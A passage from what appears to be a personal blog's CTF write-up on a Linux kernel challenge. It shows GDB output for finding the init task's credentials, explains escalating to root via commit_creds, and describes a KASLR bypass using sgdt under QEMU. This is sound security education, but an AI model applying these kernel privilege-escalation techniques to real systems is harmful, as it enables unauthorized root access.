   <span style="color:yellow">0xffffffff814b1a3f</span>:	<span style="color:lightblue;font-weight:bold">ret</span>
</pre> <p>Which does exactly that.</p> <h3 id="privlege-escalation">Privlege Escalation</h3> <p>The first thing I remember from my kernel exploitation reading was that the <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> was the way to go for privilege escalation. However, it turns out that we could just re-use a creds structure from an existing process.</p> <p>The <code class="language-plaintext highlighter-rouge">struct task_struct</code> has two pointers to <code class="language-plaintext highlighter-rouge">struct cred</code> structures followed by a <code class="language-plaintext highlighter-rouge">comm</code> buffer.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/* Objective and real subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>

    <span class="cm">/* Effective (overridable) subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">cred</span><span class="p">;</span>

    <span class="cm">/*
     * executable name, excluding path.
     *
     * - normally initialized begin_new_exec()
     * - set it with set_task_comm()
     *   - strscpy_pad() to ensure it is always NUL-terminated and
     *     zero-padded
     *   - task_lock() to ensure the operation is atomic and the name is
     *     fully updated.
     */</span>
    <span class="kt">char</span>				<span class="n">comm</span><span class="p">[</span><span class="n">TASK_COMM_LEN</span><span class="p">];</span>
</code></pre></div></div> <p>Now, for the <code class="language-plaintext highlighter-rouge">init_task</code>, the comm is <code class="language-plaintext highlighter-rouge">swapper</code>. So if we search the memory in GDB for <code class="language-plaintext highlighter-rouge">swapper</code>, we can find the <code class="language-plaintext highlighter-rouge">real_cred</code> and <code class="language-plaintext highlighter-rouge">cred</code> pointers just before this string which give us the pointer to a <code class="language-plaintext highlighter-rouge">struct creds</code> for the <code class="language-plaintext highlighter-rouge">init</code> process which is running as root.</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">search-pattern swapper</span>
<span style="color:gray">[+] Searching 'swapper' in memory</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001a00000</span>-<span style="color:yellow">0xffff888001caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffff888001c2533e</span> - <span style="color:yellow">0xffff888001c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001caf000</span>-<span style="color:yellow">0xffff8880020dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffff888001e0ca50</span> - <span style="color:yellow">0xffff888001e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81a00000</span>-<span style="color:yellow">0xffffffff81caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffffffff81c2533e</span> - <span style="color:yellow">0xffffffff81c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81caf000</span>-<span style="color:yellow">0xffffffff820dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffffffff81e0ca50</span> - <span style="color:yellow">0xffffffff81e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">tele 0xffffffff81e0ca50-0x10</span>
<span style="color:yellow">0xffffffff81e0ca40</span>│+0x0000: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ real_cred</span>
<span style="color:yellow">0xffffffff81e0ca48</span>│+0x0008: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ cred</span>
<span style="color:yellow">0xffffffff81e0ca50</span>│+0x0010: <span style="color:lightblue">"swapper/0"</span>                                  <span style="color:gray">&lt;------ comm</span>
<span style="color:yellow">0xffffffff81e0ca58</span>│+0x0018: <span style="color:orange">0x0000000000000030</span> (<span style="color:lightblue">"0"?</span>)
<span style="color:yellow">0xffffffff81e0ca60</span>│+0x0020: <span style="color:orange">0x0000000000000000</span>
</pre> <p>So, all we need to do is just call <code class="language-plaintext highlighter-rouge">commit_creds(0xffffffff81e3bf60)</code> to become root.</p> <h3 id="the-final-touches">The final touches</h3> <p>With some magic about <code class="language-plaintext highlighter-rouge">swapgs</code> and <code class="language-plaintext highlighter-rouge">iretq</code> as perfectly explained by lkmidas <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" rel="external nofollow noopener" target="_blank">here</a>, all we had to do was to return to user space properly and run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code>.</p> <p>It also turns out that the VM has a libc inside it. So we don’t need to compile the exploit statically which significantly reduces the size of the binary. Still, with some <code class="language-plaintext highlighter-rouge">gzip</code> + <code class="language-plaintext highlighter-rouge">base64</code> magic, @zolutal was able to run the exploit on the remote machine and got the flag.</p> <p>The final exploit code is available <a href="/assets/c/asis/exploit.c">here</a>. And the challenge files are available <a href="/assets/binary/asis/vuln.tar.gz">here</a>.</p> <h2 id="extra-credit">Extra Credit</h2> <p>After the CTF, I saw @kylebot and @zolutal talk about other writeups for this challenge and @kylebot mentioned that some writeup managed to use the CPU Entry Area. Apparently, there’s a special instruction called <code class="language-plaintext highlighter-rouge">sgdt</code> which can return the pointer to the randomized CPU Entry Area (thus defeating KASLR). But, on modern kernels (&lt;6.2), this instruction is not allowed because of the 11th bit in the <code class="language-plaintext highlighter-rouge">CR4</code> register called <code class="language-plaintext highlighter-rouge">UMIP</code> (User-Mode Instruction Prevention). However, this mitigation isn’t implemented in QEMU (when its using TCG) and so it can be used to leak the CPU Entry Area address. Their solution involved storing the fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> in the CPU Entry Area, followed by using the <code class="language-plaintext highlighter-rouge">sgdt</code> instruction to get the address of the fake structure which is then used to overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>Additionally, this challenge would not panic on warnings, and so it would have been possible to just leak a kernel pointer using a warning. Maybe I’ll think of these the next time I try a kernel challenge.</p> <p>I recommend reading their writeup which is available <a href="https://kqx.io/writeups/fileno/" rel="external nofollow noopener" target="_blank">here</a>.</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="//blog/2024/m0lectf24ducts/">M0lecon CTF Teaser 2024 ducts Writeup</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="//blog/2023/m0lectf23noregvm/">M0lecon CTF 2023 NoRegVM Writeup</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="//blog/2023/0ctf22ezvm/">OCTF 2022 EZVM Writeup</a> </li> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 Jayakrishna Menon Vadayath. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-LM199MC2FW"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-LM199MC2FW");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>addBackToTop();</script> </body> </html>